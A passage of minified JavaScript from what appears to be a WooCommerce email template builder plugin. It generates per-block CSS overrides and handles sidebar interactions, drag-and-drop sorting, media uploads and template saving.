css=prepare_layout_col_css_override(key,props,blockId,isPrev);break;case"text":css=prepare_block_css_override_text(key,props,blockId,isPrev);break;case"image":css=prepare_block_css_override_image(key,props,blockId,isPrev);break;case"gap":css=prepare_block_css_override_gap(key,props,blockId,isPrev);break;case"social":css=prepare_block_css_override_social(key,props,blockId,isPrev);break;case"button":css=prepare_block_css_override_button(key,props,blockId,isPrev);break;case"divider":css=prepare_block_css_override_divider(key,props,blockId,isPrev);break;case"gif":css=prepare_block_css_override_gif(key,props,blockId,isPrev);break;case"header_details":css=prepare_block_css_override_header(key,props,blockId,isPrev);break;case"customer_address":css=prepare_block_css_override_customer(key,props,blockId,isPrev);break;case"order_details":css=prepare_block_css_override_order(key,props,blockId,isPrev);break;case"billing_address":css=prepare_block_css_override_billing_address(key,props,blockId,isPrev);break;case"shipping_address":css=prepare_block_css_override_shipping_address(key,props,blockId,isPrev);break;case"t_builder":css=prepare_block_css_override_t_builder(key,props,blockId,isPrev);break;default:css=""}return css}function prepare_builder_text_override(js_props,block_id,block_name){block_id="tbf_"+block_id;var text_elm_class=get_text_props(js_props,block_id,block_name);$.each(text_elm_class,function(name,props){if(""==props.class)var block_ref=$("#"+block_id);else{var block_ref=$("#"+block_id).find(props.class);block_ref=block_ref.length<1?$("#"+block_id):block_ref}if(block_ref)if("image"==props.attribute)block_ref.attr("src",js_props[name]);else if("html"==props.attribute)if("text"==block_name){var formated_txt=js_props[name].replace(/\r?\n/g,"<br/>");block_ref.html(formated_txt)}else block_ref.html(js_props[name]);else"text"==props.attribute?block_ref.text(js_props[name]):"link"==props.attribute?block_ref.attr("href",js_props[name]):"title"==props.attribute&&block_ref.attr("title",js_props[name])})}function prepare_layout_row_css_override(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-row",row_css="",row_props_arr=["height","p_t","p_r","p_b","p_l","m_t","m_r","m_b","m_l","b_t","b_r","b_b","b_l","border_style","border_color","bg_color","upload_bg_url"];return-1!==$.inArray(key,row_props_arr)&&(row_css=w_selector+" {",row_css+=builder_css_generator(props),row_css+="}"),row_css}function prepare_layout_col_css_override(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-column-padding",col_css="",col_props=["width","text_align","p_t","p_r","p_b","p_l","b_t","b_r","b_b","b_l","border_style","border_color","bg_color","upload_bg_url"];return-1!==$.inArray(key,col_props)&&(col_css=w_selector+"{",col_css+=builder_css_generator(props),col_css+="}"),col_css}function prepare_block_css_override_text(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-text",tb_css="",td_css="",content_css="",tb_props=["color","align","font_size","font_weight","line_height","font_family","size_width","size_height","m_t","m_r","m_b","m_l","text_align"];-1!==$.inArray(key,tb_props)&&(tb_css=w_selector+"{",tb_css+=builder_css_generator(props),tb_css+="}");var td_props=["color","font_size","font_weight","line_height","font_family","text_align","bg_color","b_t","b_r","b_b","b_l","border_color","border_style","p_t","p_r","p_b","p_l","upload_bg_url"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" .thwecmf-block-text-holder{",td_css+=builder_css_generator(props),td_css+="}");var content_props=["color","font_size"];return-1!==$.inArray(key,content_props)&&(content_css=w_selector+" *:not(br):not(a),",content_css+=w_selector+" .wecmf-txt-wrap{",content_css+=builder_css_generator(props),content_css+="}"),tb_css+td_css+content_css}function prepare_block_css_override_header(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-header",w_css="",tr_css="",td_css="",img_css="",h1_wp_css="",h1_css="",logo_css="",w_props=["size_width","size_height","bg_color","b_t","b_r","b_b","b_l","border_style","border_color"];-1!==$.inArray(key,w_props)&&(w_css=w_selector+"{",w_css+=builder_css_generator(props),w_css+="}");var tr_props=["upload_img_url"];-1!==$.inArray(key,tr_props)&&(tr_css=w_selector+" .thwecmf-header-logo-tr{",tr_css+=builder_css_generator(props),tr_css+="}");var td_props=["content_align"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" .thwecmf-header-logo{",td_css+=builder_css_generator(props),td_css+="}");var img_props=["img_size_height","img_size_width","align"];if(-1!==$.inArray(key,img_props)&&(img_css=w_selector+" .thwecmf-header-logo .thwecmf-header-logo-ph{",img_css+=builder_css_generator(props),img_css+="}"),"img_size_height"===key){var logo_content_css={key:""};logo_content_css[key]="auto"===props[key]?"auto":"100%",logo_css=w_selector+" .thwecmf-header-logo .thwecmf-header-logo-ph img{",logo_css+=builder_css_generator(logo_content_css),logo_css+="}"}var h1_wp_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,h1_wp_props)&&(h1_wp_css=w_selector+" .thwecmf-header-text{",h1_wp_css+=builder_css_generator(props),h1_wp_css+="}");var h1_props=["font_size","color","font_weight","text_align","line_height","font_family"];return-1!==$.inArray(key,h1_props)&&(h1_css=w_selector+" .thwecmf-header-text h1{",h1_css+=builder_css_generator(props),h1_css+="}"),w_css+tr_css+td_css+img_css+h1_wp_css+h1_css+logo_css}function prepare_block_css_override_customer(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-customer",tb_wrapper_css="",w_css="",h2_css="",details_css="",tb_wrapper_props=["bg_color","upload_bg_url","m_t","m_r","m_b","m_l"];-1!==$.inArray(key,tb_wrapper_props)&&(tb_wrapper_css=w_selector+" .thwecmf-address-wrapper-table{",tb_wrapper_css+=builder_css_generator(props),tb_wrapper_css+="}");var w_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,w_props)&&(w_css=w_selector+" .thwecmf-customer-padding{",w_css+=builder_css_generator(props),w_css+="}");var h2_props=["font_size","color","text_align","font_family"];-1!==$.inArray(key,h2_props)&&(h2_css=w_selector+" .thwecmf-customer-header{",h2_css+=builder_css_generator(props),h2_css+="}");var details_props=["details_font_size","details_color","details_text_align","details_font_family"];return-1!==$.inArray(key,details_props)&&(details_css=w_selector+" .thwecmf-customer-body{",details_css+=builder_css_generator(props),details_css+="}"),tb_wrapper_css+w_css+h2_css+details_css}function prepare_block_css_override_order(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-order",elm_css="",w_css="",h2_css="",table_css="",tb_content_css="",tb_image_css="",elm_props=["bg_color","upload_bg_url"];-1!==$.inArray(key,elm_props)&&(elm_css=w_selector+"{",elm_css+=builder_css_generator(props),elm_css+="}");var w_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,w_props)&&(w_css=w_selector+" .thwecmf-order-padding{",w_css+=builder_css_generator(props),w_css+="}");var h2_props=["color","font_size","font_family"];-1!==$.inArray(key,h2_props)&&(h2_css=w_selector+" .thwecmf-order-heading{",h2_css+=builder_css_generator(props),h2_css+="}");var table_props=["content_border_color","details_font_family"];-1!==$.inArray(key,table_props)&&(table_css=w_selector+" .thwecmf-order-table{",table_css+=builder_css_generator(props),table_css+="}");var tb_content_props=["details_font_size","details_text_align","details_color","details_font_family","content_border_color"];-1!==$.inArray(key,tb_content_props)&&(tb_content_css=w_selector+" .thwecmf-td{",tb_content_css+=builder_css_generator(props),tb_content_css+="}",prepare_ot_column_styles(blockId,key,props));var tb_image_props=["product_img"];return-1!==$.inArray(key,tb_image_props)&&(tb_image_css=w_selector+" .thwecmf-td .thwecmf-order-item-img{",tb_image_css+=builder_css_generator(props),tb_image_css+="}"),elm_css+w_css+h2_css+table_css+tb_content_css+tb_image_css}function prepare_ot_column_styles(blockId,key,props){var block=1===$("#"+blockId).length&&$("#"+blockId),ot_td_css=!1;if(block){var ot_td_elm=block.find(".order-total-loop-end"),ot_td_css=ot_td_elm.attr("data-ot-css");ot_td_css&&(ot_td_css=$.parseJSON(ot_td_css),ot_td_css[key]&&("details_font_family"==key||"font_family"==key?$.each(FONT_LIST,function(f_key,f_value){f_value==props[key]&&(ot_td_css[key]=f_key)}):ot_td_css[key]=props[key]),ot_td_css=JSON.stringify(ot_td_css)),ot_td_elm.attr("data-ot-css",ot_td_css)}}function prepare_block_css_override_billing_address(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-billing",align_css="",td_css="",header_css="",body_css="",align_props=["align"];-1!==$.inArray(key,align_props)&&(align_css=w_selector+" .thwecmf-address-alignment{",align_css+=builder_css_generator(props),align_css+="}");var tb_props=["size_width","size_height","bg_color","upload_bg_url","b_t","b_r","b_b","b_l","border_style","border_color","m_t","m_r","m_b","m_l"];-1!==$.inArray(key,tb_props)&&(td_css=w_selector+" .thwecmf-address-wrapper-table{",td_css+=builder_css_generator(props),td_css+="}");var td_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" .thwecmf-billing-padding{",td_css+=builder_css_generator(props),td_css+="}");var header_props=["font_size","color","text_align","font_family"];-1!==$.inArray(key,header_props)&&(header_css=w_selector+" .thwecmf-billing-header{",header_css+=builder_css_generator(props),header_css+="}");var body_props=["details_font_size","details_color","details_text_align","details_font_family"];return-1!==$.inArray(key,body_props)&&(body_css=w_selector+" .thwecmf-billing-body{",body_css+=builder_css_generator(props),body_css+="}"),align_css+""+td_css+header_css+body_css}function prepare_block_css_override_image(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-image",tb_css="",td_css="",content_css="",img_css="",tb_props=["img_bg_color"];-1!==$.inArray(key,tb_props)&&(tb_css=w_selector+"{",tb_css+=builder_css_generator(props),tb_css+="}");var td_props=["content_align","img_p_t","img_p_r","img_p_b","img_p_l"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" td.thwecmf-image-column{",td_css+=builder_css_generator(props),td_css+="}");var content_props=["img_size_width","img_size_height"];if(-1!==$.inArray(key,content_props)&&(content_css=w_selector+" td.thwecmf-image-column p{",content_css+=builder_css_generator(props),content_css+="}"),"img_size_height"===key){var img_content_css={key:""};img_content_css[key]="auto"===props[key]?"auto":"100%",img_css=w_selector+" td.thwecmf-image-column p img{",img_css+=builder_css_generator(img_content_css),img_css+="}"}return tb_css+td_css+content_css+img_css}function prepare_block_css_override_shipping_address(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-shipping",align_css="",td_css="",header_css="",body_css="",align_props=["align"];-1!==$.inArray(key,align_props)&&(align_css=w_selector+" .thwecmf-address-alignment{",align_css+=builder_css_generator(props),align_css+="}");var tb_props=["size_width","size_height","bg_color","upload_bg_url","b_t","b_r","b_b","b_l","border_style","border_color","m_t","m_r","m_b","m_l"];-1!==$.inArray(key,tb_props)&&(td_css=w_selector+" .thwecmf-address-wrapper-table{",td_css+=builder_css_generator(props),td_css+="}");var td_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" .thwecmf-shipping-padding{",td_css+=builder_css_generator(props),td_css+="}");var header_props=["font_size","color","text_align","font_family"];-1!==$.inArray(key,header_props)&&(header_css=w_selector+" .thwecmf-shipping-header{",header_css+=builder_css_generator(props),header_css+="}");var body_props=["details_font_size","details_color","details_text_align","details_font_family"];return-1!==$.inArray(key,body_props)&&(body_css=w_selector+" .thwecmf-shipping-body{",body_css+=builder_css_generator(props),body_css+="}"),align_css+""+td_css+header_css+body_css}function prepare_block_css_override_gap(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-gap",content_css="",content_props=["height","bg_color","b_t","b_b","b_l","b_r","border_style","border_color"];return-1!==$.inArray(key,content_props)&&(content_css=w_selector+"{",content_css+=builder_css_generator(props),content_css+="}"),content_css}function prepare_block_css_override_social(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-social",w_css="",inner_tb_css="",table_td_css="",icon_img_css="",icons_css="",icon1_css="",icon2_css="",icon3_css="",icon4_css="",icon5_css="",icon6_css="",icon7_css="",tb_props_arr=["bg_color","upload_bg_url"];-1!==$.inArray(key,tb_props_arr)&&(w_css=w_selector+"{",w_css+=builder_css_generator(props),w_css+="}");var inner_tb_props=["p_t","p_r","p_b","p_l"];-1!==$.inArray(key,inner_tb_props)&&(inner_tb_css=w_selector+" .thwecmf-social-outer-td{",inner_tb_css+=builder_css_generator(props),inner_tb_css+="}");var table_td_props=["icon_p_t","icon_p_r","icon_p_b","icon_p_l"];-1!==$.inArray(key,table_td_props)&&(table_td_css=w_selector+" .thwecmf-social-td{",table_td_css+=builder_css_generator(props),table_td_css+="}");var icons_props=["img_size_width","img_size_height"];if(-1!==$.inArray(key,icons_props)&&(icons_css=w_selector+" .thwecmf-social-icon{",icons_css+=builder_css_generator(props),icons_css+="}"),"img_size_height"===key){var icon_content_css={key:""};icon_content_css[key]="auto"===props[key]?"auto":"100%",icon_img_css=w_selector+" .thwecmf-social-icon img{",icon_img_css+=builder_css_generator(icon_content_css),icon_img_css+="}"}return-1!==$.inArray(key,["url1"])&&(icon1_css=w_selector+" td.thwecmf-td-fb{",icon1_css+=builder_css_generator(props),icon1_css+="}"),-1!==$.inArray(key,["url2"])&&(icon2_css=w_selector+" td.thwecmf-td-mail{",icon2_css+=builder_css_generator(props),icon2_css+="}"),-1!==$.inArray(key,["url3"])&&(icon3_css=w_selector+" td.thwecmf-td-tw{",icon3_css+=builder_css_generator(props),icon3_css+="}"),-1!==$.inArray(key,["url4"])&&(icon4_css=w_selector+" td.thwecmf-td-yb{",icon4_css+=builder_css_generator(props),icon4_css+="}"),-1!==$.inArray(key,["url5"])&&(icon5_css=w_selector+" td.thwecmf-td-lin{",icon5_css+=builder_css_generator(props),icon5_css+="}"),-1!==$.inArray(key,["url6"])&&(icon6_css=w_selector+" td.thwecmf-td-pin{",icon6_css+=builder_css_generator(props),icon6_css+="}"),-1!==$.inArray(key,["url7"])&&(icon7_css=w_selector+" td.thwecmf-td-insta{",icon7_css+=builder_css_generator(props),icon7_css+="}"),w_css+inner_tb_css+table_td_css+icons_css+icon1_css+icon2_css+icon3_css+icon4_css+icon5_css+icon6_css+icon7_css+icon_img_css}function prepare_block_css_override_button(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-button-wrapper-table",btn_wrapper_css="",btn_css="",link_css="",btn_wrapper_props=["size_width","size_height","m_t","m_r","m_b","m_l","p_t","p_r","p_b","p_l"];-1!==$.inArray(key,btn_wrapper_props)&&(btn_wrapper_css=w_selector+"{",btn_wrapper_css+=builder_css_generator(props),btn_wrapper_css+="}");var btn_props=["font_weight","font_size","font_family","color","bg_color","b_t","b_b","b_l","b_r","border_style","border_color","content_p_t","content_p_r","content_p_b","content_p_l","text_align"];-1!==$.inArray(key,btn_props)&&(btn_css=w_selector+" .thwecmf-button-wrapper{",btn_css+=builder_css_generator(props),btn_css+="}");var link_props=["font_weight","line_height","font_size","font_family","color","text_align"];return-1!==$.inArray(key,link_props)&&(link_css=w_selector+" .thwecmf-button-link{",link_css+=builder_css_generator(props),link_css+="}"),btn_wrapper_css+btn_css+link_css}function prepare_block_css_override_divider(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-divider",tb_css="",td_css="",content_css="",tb_props=["m_t","m_r","m_b","m_l"];-1!==$.inArray(key,tb_props)&&(tb_css=w_selector+"{",tb_css+=builder_css_generator(props),tb_css+="}");var td_props=["p_t","p_r","p_b","p_l","content_align"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" td{",td_css+=builder_css_generator(props),td_css+="}");var content_props=["width","divider_height","divider_color","divider_style"];return-1!==$.inArray(key,content_props)&&(content_css=w_selector+" td hr{",content_css+=builder_css_generator(props),content_css+="}"),tb_css+td_css+content_css}function prepare_block_css_override_gif(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-block-gif",tb_css="",td_css="",gif_css="",gif_img_css="",tb_props=["bg_color"];-1!==$.inArray(key,tb_props)&&(tb_css=w_selector+"{",tb_css+=builder_css_generator(props),tb_css+="}");var td_props=["content_align"];-1!==$.inArray(key,td_props)&&(td_css=w_selector+" td.thwecmf-gif-column{",td_css+=builder_css_generator(props),td_css+="}");var gif_props=["img_size_width","img_size_height","p_t","p_r","p_b","p_l"];if(-1!==$.inArray(key,gif_props)&&(gif_css=w_selector+" td.thwecmf-gif-column p{",gif_css+=builder_css_generator(props),gif_css+="}"),"img_size_height"===key){var gif_content_css={key:""};gif_content_css[key]="auto"===props[key]?"auto":"100%",gif_img_css=w_selector+" td.thwecmf-gif-column p img{",gif_img_css+=builder_css_generator(gif_content_css),gif_img_css+="}"}return tb_css+td_css+gif_css+gif_img_css}function prepare_block_css_override_t_builder(key,props,blockId,isPrev){var p_selector=css_parent_selector(blockId,isPrev),w_selector=p_selector+".thwecmf-main-builder",td_css="",td_props=["b_t","b_r","b_b","b_l","border_style","border_color","bg_color","upload_bg_url"];return-1!==$.inArray(key,td_props)&&(td_css=w_selector+" .thwecmf-builder-column{",td_css+=builder_css_generator(props),td_css+="}"),td_css}function get_text_props(js_props,block_id,block_name){var text_css={};switch(block_name){case"header_details":text_css={content:{class:".thwecmf-header-text h1",attribute:"html"},upload_img_url:{class:".thwecmf-header-logo-ph img",attribute:"image"}};break;case"customer_address":text_css={content:{class:".thwecmf-customer-header",attribute:"html"}};break;case"billing_address":text_css={content:{class:".thwecmf-billing-header",attribute:"html"}};break;case"shipping_address":text_css={content:{class:".thwecmf-shipping-header",attribute:"html"}};break;case"text":text_css={textarea_content:{class:".thwecmf-block-text-holder",attribute:"html"}};break;case"image":text_css={upload_img_url:{class:"img",attribute:"image"}};break;case"social":text_css={url1:{class:".facebook",attribute:"link"},url2:{class:".mail",attribute:"link"},url3:{class:".twitter",attribute:"link"},url4:{class:".youtube",attribute:"link"},url5:{class:".linkedin",attribute:"link"},url6:{class:".pinterest",attribute:"link"},url7:{class:".instagram",attribute:"link"}};break;case"button":text_css={content:{class:".thwecmf-button-link",attribute:"html"},url:{class:".thwecmf-button-link",attribute:"link"},title:{class:".thwecmf-button-link",attribute:"title"}};break;case"gif":text_css={upload_img_url:{class:"img",attribute:"image"}};break;default:text_css=""}return text_css}function reset_sidebar_status($configure){var sidebar_nav=$("#thwecmf_header_sidebar_nav");if($configure){var active="thwecmf-sidebar-configure",inactive="thwecmf-sidebar-settings";sidebar_nav.addClass("thwecmf-inactive-nav"),T_NAVIGATION=!1}else{var active="thwecmf-sidebar-settings",inactive="thwecmf-sidebar-configure";sidebar_nav.removeClass("thwecmf-inactive-nav"),T_NAVIGATION=!0}var settings_panel=$("#thwecmf-sidebar-element-wrapper");if(settings_panel.find("#"+active).removeClass("inactive-tab").addClass("thwecmf-active-tab"),settings_panel.find("#"+inactive).removeClass("thwecmf-active-tab").addClass("inactive-tab"),1==$("#thwecmf-sidebar-settings").find(".thwecmf-block-settings-form").length&&$configure){var block_id=$("#thwecmf-sidebar-settings").find('input[name="i_thwecmf_block_id"]').val(),builder_elm=$("#tbf_"+block_id),panel_elm=$("#"+block_id);(builder_elm.hasClass("thwecmf-block")||builder_elm.hasClass("hook-code"))&&highlight_focus_blocks(builder_elm,panel_elm)}}function initialize_sidebar_clicks(){$("#thwecmf-sidebar-settings").on("click",".thwecmf-elm-col",function(event){var form=$("#thwecmf_tbuilder_layout_elm_form");reset_sidebar_status("thwecmf-sidebar-configure","thwecmf-sidebar-configure");var block_identifier=get_field_value(form,"hidden","thwecmf_block_id"),col_count=get_field_value(form,"hidden","thwecmf_col_count");block_identifier=block_identifier||"",add_builder_elements($(this).find("div").data("block-name"),block_identifier,col_count),setup_builder_ui(),setup_sidebar_scrolls(!1),$("#tbf_t_builder").attr("data-sidebar-change","false")}),$(".thwecmf-tbuilder-wrapper").on("click",".thwecmf-btn-add-element",function(event){event.preventDefault(),setup_sidebar_content("layout-elements");var form=$("#thwecmf_tbuilder_layout_elm_form");if($(this).hasClass("panel-add-btn"))var click_elm=$(this).closest("div.thwecmf-columns").attr("id"),column_count=$(this).closest(".thwecmf-rows.thwecmf-panel-builder-block").attr("data-columns");else if($(this).hasClass("thwecmf-builder-add-btn"))var click_elm=$(this).closest("td").attr("id").replace("tbf_",""),column_count=$(this).closest(".thwecmf-row.thwecmf-builder-block").attr("data-column-count");set_field_value(form,"hidden","thwecmf_block_id",click_elm,0),set_field_value(form,"hidden","thwecmf_col_count",column_count,0),reset_sidebar_status(!1),$("#thwecmf-sidebar-settings").find(".thwecmf-tbuilder-elm-grid-layout-element .column-basic-elements .grid-category").removeClass("category-collapse"),setup_sidebar_panel_scrolls(!1,!1,!1,!0)}),$(".thwecmf-tbuilder-wrapper").on("click",".thwecmf-element-name,.thwecmf-hook-name",function(event){var clicked=$(this),panel_elm=clicked.closest(".thwecmf-panel-builder-block"),panel_elm_id=panel_elm.attr("id");highlight_focus_blocks($("#tbf_"+panel_elm_id),panel_elm)}),$(".thwecmf-tbuilder-wrapper").on("click",".thwecmf-aligment-icon-wrapper .img-wrapper",function(event){var icon_elm=$(this),icon_wrapper=$(this).closest(".thwecmf-aligment-icon-wrapper"),align_val=icon_elm.attr("data-align");icon_wrapper.find(".thwecmf-text-align-input").val(align_val),icon_wrapper.find(".thwecmf-text-align-input").trigger("keyup"),icon_wrapper.find(".thwecmf-active-icon").removeClass("thwecmf-active-icon"),icon_wrapper.find(".thwecmf-active-icon").removeClass("thwecmf-active-icon"),icon_elm.addClass("thwecmf-active-icon")}),$("#thwecmf-sidebar-settings").on("keyup","form :input",function(event){save_sidebar_edit_form($(this),event)}),$("#thwecmf-sidebar-settings").on("change","select",function(event){save_sidebar_edit_form($(this),event)}),$("#thwecmf-sidebar-settings").on("change",'input[name="i_checkbox_option_image"]',function(event){save_sidebar_edit_form($(this),event)})}function initialize_popups(){$("#thwecmf_confirmation_alerts").dialog({position:{my:"center",at:"center",of:$("#thwecmf-sidebar-element-wrapper")},draggable:!0,appendTo:"#thwecmf-sidebar-element-wrapper",modal:!0,width:275,resizable:!1,autoOpen:!1,dialogClass:"thwecmf-confirmations",buttons:[{text:"No",click:function(){$(this).dialog("close")}},{text:"Yes",click:function(){confirmation_tbuilder_clear(),$(this).dialog("close")}}]}).parent().draggable({containment:"#dialogContainer"})}function remove_image_uploaded(elm){var upload_pointer=$(elm),upload_preview=upload_pointer.siblings(".thwecmf-upload-preview"),default_url=upload_preview.attr("data-default-url");upload_preview.closest(".thwecmf-upload-action-settings").find(".thwecmf-upload-url").val(default_url).trigger("keyup"),upload_pointer.closest(".thwecmf-upload-action-settings").find(".thwecmf-upload-preview img").attr("src",default_url);var notice_tag=upload_pointer.closest(".thwecmf-upload-action-settings").siblings(".thwecmf-upload-notices");notice_tag.find("p").length>0&&notice_tag.find("p").remove(),upload_pointer.addClass("thwecmf-remove-upload-inactive")}function setup_wp_image_upload(elm,prop){var frame,file_valid,validation_msg;frame=wp.media({title:"Upload Media Of Your Interest",button:{text:"Choose this"},multiple:!1}),frame.open(),frame.on("select",function(){var thwecmf_attachment=frame.state().get("selection").first().toJSON();"gif"==prop?(file_valid="image/gif"==thwecmf_attachment.mime,validation_msg="<p>Invalid file type. Choose a Gif file</p>"):(file_valid="image"==thwecmf_attachment.type&&-1!==$.inArray(thwecmf_attachment.mime,UPLOAD_FILE_TYPES),validation_msg="<p>Invalid file type. Choose an image file <br>[ jpg, jpeg, png ]</p>");var thwecmf_attachment_url=thwecmf_attachment.url,form_table=$("#thwecmf-sidebar-settings").find("form"),upload_block=form_table.find(".thwecmf-upload-action-settings.thwecmf-img-preview-"+prop);file_valid?("bg_image"==prop?(set_field_value(form_table,"text","upload_bg_url",thwecmf_attachment_url,0),form_table.find('input[name="i_upload_bg_url"]').trigger("keyup")):"image"!=prop&&"gif"!=prop||(set_field_value(form_table,"text","upload_img_url",thwecmf_attachment_url,0),form_table.find('input[name="i_upload_img_url"]').trigger("keyup")),upload_block.find(".thwecmf-upload-preview img").attr("src",thwecmf_attachment_url),upload_block.find(".thwecmf-remove-upload-btn").hasClass("thwecmf-remove-upload-inactive")&&upload_block.find(".thwecmf-remove-upload-btn").removeClass("thwecmf-remove-upload-inactive"),upload_block.closest("td").find(".thwecmf-upload-notices").html("")):upload_block.closest("td").find(".thwecmf-upload-notices").html(validation_msg)})}function setup_builder_ui(){setup_sortable_sidebar_blocks("div.thwecmf-builder-elm-layers",".thwecmf-sortable-row-handle",".thwecmf-rows",".thwecmf-element-set,.thwecmf-builder-elm-layers",sortable_start_handler,sortable_out_handler,sortable_stop_handler,null,sortable_receive_handler,sortable_update_handler),setup_sortable_sidebar_blocks("div.thwecmf-column-set",".sortable-col-handle","> div.thwecmf-columns","",sortable_start_handler,sortable_out_handler,sortable_stop_handler,null,null,sortable_update_handler),setup_sortable_sidebar_blocks("div.thwecmf-element-set",".sortable-elm-handle","div.thwecmf-hooks,div.thwecmf-elements:not(.panel-add-btn)",".thwecmf-element-set,div.thwecmf-builder-elm-layers",sortable_start_handler,sortable_out_handler,sortable_stop_handler,null,null,sortable_update_handler)}function setup_sortable_sidebar_blocks(elm,handle,items,connectWith,start_handler,out_handler,stop_handler,over_handler,receive_handler,update_handler){$(elm).sortable({handle:handle,axis:"x,y",items:items,scroll:!0,cursor:"move",helper:"clone",placeholder:"sortable-row-placeholder",connectWith:connectWith,forcePlaceholderSize:!0,start:start_handler,out:out_handler,over:over_handler,stop:stop_handler,receive:receive_handler,update:update_handler}),$(elm).disableSelection()}function sortable_start_handler(event,ui){BLOCK_DRAGG=ui.item.attr("class"),BLOCK_DRAGG=$.trim(BLOCK_DRAGG.replace("thwecmf-panel-builder-block","")),$(ui.helper).addClass("dragg"),"thwecmf-rows"==BLOCK_DRAGG?(ui.helper.find(".thwecmf-column-set").css("display","none"),ui.helper.css("height","unset")):"thwecmf-columns"==BLOCK_DRAGG?(ui.helper.find(".thwecmf-element-set").css("display","none"),ui.helper.css("height","unset"),ui.placeholder.addClass("ui-sortable-placeholder-columns")):"thwecmf-elements"!=BLOCK_DRAGG&&"thwecmf-hooks"!=BLOCK_DRAGG||ui.placeholder.addClass("ui-sortable-placeholder-element-hooks")}function sortable_out_handler(event,ui){if(("thwecmf-rows"==BLOCK_DRAGG||"thwecmf-elements"==BLOCK_DRAGG)&&ui.item.closest(".thwecmf-columns").length>0){var prev_parent_id=ui.item.closest(".thwecmf-columns").attr("id");ui.item.data("prev-parent",prev_parent_id)}}function sortable_stop_handler(event,ui){$(ui.helper).removeClass("dragg"),$(this).hasClass("thwecmf-elements")&&ui.item.hasClass("thwecmf-elements")}function sortable_receive_handler(event,ui){!$(this).hasClass("thwecmf-builder-elm-layers")||"thwecmf-elements"!=BLOCK_DRAGG&&"thwecmf-hooks"!=BLOCK_DRAGG||(ui.placeholder.hide(),ui.sender.sortable("cancel"),alert("Cannot place an element outside a column"))}function sortable_update_handler(event,ui){var track_id="tbf_"+ui.item.attr("id"),next_id=ui.item.next().attr("id"),prev_id=ui.item.prev().attr("id");if(prev_id?(prev_id="tbf_"+prev_id,$($("#tbf_t_builder").find("#"+track_id)).insertAfter($("#"+prev_id))):(next_id="tbf_"+next_id,$($("#tbf_t_builder").find("#"+track_id)).insertBefore($("#"+next_id))),ui.item.closest(".thwecmf-element-set").closest(".thwecmf-columns").length>0){var prev_parent=ui.item.data("prev-parent"),track_id=(ui.item.closest(".thwecmf-element-set").closest(".thwecmf-columns").attr("id"),ui.item.attr("id")),next_id=ui.item.next().attr("id"),prev_id=ui.item.prev().attr("id");if(ui.item.closest(".thwecmf-columns").attr("id"))var column_id=ui.item.closest(".thwecmf-columns").attr("id");var data=$("#tbf_t_builder").find("#tbf_"+track_id);prev_id?$(data).insertAfter($("#tbf_"+prev_id)):next_id?$(data).insertBefore($("#tbf_"+next_id)):next_id||prev_id||$("#tbf_t_builder").find("#tbf_"+column_id).html(data);var prev_parent_ref=$("#tbf_"+prev_parent);prev_parent_ref.find(".thwecmf-builder-block").length<1&&prev_parent_ref.find(".thwecmf-hook-code").length<1&&$("#tbf_"+prev_parent).html(EMPTY_TD_DATA)}}function builder_prepare_save_template(elm){var json_tree=json_from_sb_layers(),template_name_valid=!0,blank_builder_valid=!0,template_builder=$("#tbf_t_builder"),block_length=template_builder.find(".thwecmf-block").length,hook_length=template_builder.find(".thwecmf-hook-code").length,tname=$("#thwecmf_template_save_name").val(),tcontent=$("#thwecmf_drag_n_drop").innerHTML,tcss=$("#thwecmf_template_css").html(),input_validation=validate_temp_name(tname,"Template");template_name_valid=0===input_validation.length,blank_builder_valid=block_length>0||hook_length>0,blank_builder_valid?template_name_valid?template_name_valid&&blank_builder_valid&&(template_builder.attr("data-track-save",template_builder.attr("data-global-id")),template_prepare_data(tname,tcontent,tcss,json_tree),template_builder.attr("data-css-change","true"),template_builder.attr("data-sidebar-change","true")):$.each(input_validation,function(key,value){value.status||alert(value.message)}):alert("Add elements to save the template")}function json_from_sb_layers(){var layer_data=$(".thwecmf-tbuilder-elm-wrapper").find(".thwecmf-sidebar-config-elm-layers .thwecmf-builder-elm-layers"),row_struct={},row_array=[];return layer_data.find("> .thwecmf-rows.thwecmf-panel-builder-block").each(function(index,el){var row_data={},col_array=[];$(this).find("> .thwecmf-column-set > .thwecmf-columns.thwecmf-panel-builder-block").each(function(index,el){var col_data={},elm_array=[];$(this).find("> .thwecmf-element-set > .thwecmf-panel-builder-block").each(function(index,el){var elm_data={};if($(this).hasClass("thwecmf-elements")){var json_blk_id=$(this).attr("id"),json_blk_name=$(this).find(".thwecmf-block-settings 